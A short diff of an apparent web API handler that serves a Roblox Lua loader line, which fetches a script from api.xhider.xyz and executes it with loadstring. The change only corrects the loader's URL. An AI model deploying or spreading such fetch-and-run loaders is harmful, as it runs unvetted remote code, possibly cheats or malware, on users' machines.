@@ -6,7 +6,7 @@ export default function handler(req, res) {
   }
 
   const script = `
-loadstring(game:HttpGet'https://api.xhider.xyz/files/v4/loaders/8f32f6be6e47a7bc31b69fd9bd545aec.lua(1).txt')()
+loadstring(game:HttpGet'https://api.xhider.xyz/files/v4/loaders/8f32f6be6e47a7bc31b69fd9bd545aec.lua')()
 `;
 
   res.setHeader("Content-Type", "text/plain");
